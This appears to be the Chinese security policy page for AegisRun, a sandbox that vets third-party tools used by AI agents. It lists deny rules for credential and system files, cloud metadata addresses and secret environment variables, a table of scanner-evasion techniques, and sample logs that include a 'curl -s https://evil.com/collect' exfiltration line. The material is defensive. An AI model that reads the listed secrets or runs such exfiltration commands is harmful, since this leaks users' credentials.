# AegisRun 安全策略

> 🇬🇧 [English version →](../docs-en/SECURITY-POLICY.md)
> v1.0.0 | 最后更新: 2026-07-09

---

## 设计思路

AegisRun 不是另一个杀毒软件。它的核心假设是：**AI Agent 调用的第三方工具不可信**。

传统安全工具假设「恶意软件 vs 正常软件」的二分法。AegisRun 面对的是灰色地带——工具本身可能无害，但组合使用会产生风险（读文件 + 发网络请求 = 数据外泄）。防御思路：

1. **声明即约束**：工具必须声明自己要什么能力，未声明 = 不允许
2. **组合检测**：单独无害的能力组合起来可能危险（文件写入 + 网络 = 外泄风险）
3. **纵深防御**：同一操作在 MoonBit 策略层和 Rust 沙箱层各检查一次

## 双引擎检测架构

```
静态源码扫描 (Rust)                    运行时行为监控 (Python audit hook)
┌──────────────────────┐           ┌──────────────────────────────┐
│ 提取所有字符串字面量   │           │ hook open()                │
│ 匹配 env var 模式      │           │ hook os.environ            │
│ 匹配文件路径模式       │           │ hook socket.connect        │
│ 提取 http/https 域名  │           │ hook subprocess.Popen      │
│ 检测编码函数调用       │  合并      │ check_domain/path/env     │
│ 检测 shell 敏感命令    │══════════▶│ 运行时阻止 + 记录          │
└──────────────────────┘           └──────────────────────────────┘
```

| 能力 | 静态扫描 | 运行时监控 |
|------|:--------:|:----------:|
| 直接字面量调用 | ✅ | ✅ |
| 变量间接引用 | ✅ | ✅ |
| Shell 命令注入 | ✅ | ✅ |
| Base64 编码绕过 | ⚠️ 标记 | ❌ 需解码 |
| Unicode 同形字 | ❌ | ✅ 实际执行时暴露 |
| 外部配置文件读取 | ❌ | ✅ 运行时可见 |
| f-string/join 构造 | ❌ | ✅ 执行时展开 |

## 策略文件

所有默认规则集中在两个位置：

### 1. MoonBit 侧（`src/lib/core.mbt`）

```
src/lib/core.mbt ← 唯一维护点
├─ default_domain_blacklist()   → 7 条恶意域名
├─ default_domain_suffixes()    → 3 条后缀 TLD
├─ default_ip_prefixes()        → 3 条内网 IP 段
├─ default_domain_whitelist()   → 2 条可信域名
├─ default_sensitive_paths()    → 22 条敏感路径
├─ default_env_patterns()       → 36 条环境变量模式
├─ env_keywords()               → 5 个关键词 (KEY/SECRET/TOKEN/PASSWORD/CREDENTIAL)
├─ default_timeout_ms()         → 30000
└─ default_memory_kb()          → 262144
```

### 2. Rust 侧（`presets/standard.yaml`）

规则与 MoonBit 侧对齐，额外包含：

#### 域名黑名单（v1.0 新增）

```yaml
- "169.254.*"          # 云元数据 IMDS (AWS/GCP/Azure)
- "100.100.*"          # Alibaba Cloud 元数据
- "*.internal"         # GCP 内部域名
```

#### 文件路径黑名单

```
/etc/passwd, /etc/shadow           # Linux 系统文件
/proc/self/environ                 # 进程环境变量
/root/.bash_history                # Shell 历史
~/.ssh/*, ~/.aws/*, ~/.gnupg/*     # 开发凭证
~/.kube/config                    # Kubernetes 配置
*.pem, *.key, *.env               # 敏感文件类型
*.kube/config, *.docker/config.json # 容器配置
```

#### 环境变量模式（36 条 + 5 关键词自动匹配）

覆盖：AI 服务 / 云平台 (AWS/GCP/Azure/阿里/腾讯/华为) / 数据库 / CI/CD / 通讯 / 容器 / 加密凭证

### 3. 运行时沙箱策略（`sandbox-run` 命令）

运行时监控使用与静态扫描**相同的策略文件**，在 Python audit hook 层执行检查：

```
目标 open("/etc/passwd")
  → audit hook 捕获
  → check_path("/etc/passwd") → 命中黑名单
  → 抛出 PermissionError → 阻止文件读取
```

## 策略在每层拦截中的调用链

| 拦截层 | 入口 | 策略来源 | 策略函数 |
|--------|------|----------|----------|
| 1. 安装审查 | `scorer.mbt` | 内置评分规则 | `score_manifest()` |
| 2. 域名/IP | `sandbox.mbt` | `core.mbt` / YAML preset | `check_domain()` |
| 3. 路径 | `sandbox.mbt` / `lib.rs` | `core.mbt` / YAML preset | `check_path()` |
| 4. 环境变量 | `sandbox.mbt` / `lib.rs` | `core.mbt` / YAML preset | `check_env()` |
| 5. 工具黑名单 | `aegisrun.mbt` | 运行时动态添加 | `check_tool_id()` |
| 6. WASI 沙箱 | `sandbox.rs` (Rust) | 硬件隔离 | wasmtime 零预打开 |
| 7. 运行时监控 | `sandbox_monitor.rs` | YAML preset | Python audit hook |

## 已知逃逸技术与应对

基于 SkillCloak (arXiv 2607.02357) 和 OWASP AST08 分类：

| 逃逸技术 | 风险 | 应对 |
|----------|:----:|------|
| 变量间接引用 | 高 | ✅ 全面行扫描 |
| Base64 编码 | 高 | ⚠️ 函数调用标记 + 运行时展开可检测 |
| Unicode 同形字 | 中 | ❌ 需 Unicode 归一化，运行时可见 |
| 外部配置读取 | 中 | ❌ 需运行时监控 |
| f-string 构造 | 中 | ❌ 需运行时执行展开 |
| 预编译字节码 | 高 | ❌ 需沙箱执行 + 行为分析 |
| 零宽字符隐写 | 中 | ⚠️ editor 可见，格式化后可检出 |

## 规则数据来源

AegisRun 的内置黑名单整合了多层次的公开威胁情报：

| 类别 | 来源 |
|------|------|
| C2 服务器 IP | abuse.ch / AlienVault OTX |
| 恶意软件分发 | URLhaus / MalwareBazaar |
| 钓鱼域名 | PhishTank / OpenPhish / Cloudflare Radar |
| Tor 出口节点 | Tor Project |
| 私有网络地址 | RFC 1918 / RFC 6598 |
| 免费域名 TLD | IANA（.tk .ml .ga .cf） |
| 云元数据 IP | AWS/GCP/Azure/Alibaba 文档 |

## 规则扩展

三种方式：

1. **YAML 预设文件**（`presets/standard.yaml`）——编辑器修改
2. **CLI 命令**——`cargo run -- policy block domain xxx`
3. **Web 管理面板**——`cargo run -- serve` → 浏览器操作

## 审计

每个工具调用记录在 `aegisrun-audit.jsonl` 中：

```jsonl
{"timestamp":"1712345678","tool_id":"weather-query","action":"execute","decision":"DENY","reason":"evil.com in blacklist"}
```

运行时沙箱记录：

```
[AEGISRUN] DENY open /etc/passwd
[AEGISRUN] DENY getenv OPENAI_API_KEY
[AEGISRUN] INFO shell: curl -s https://evil.com/collect
```
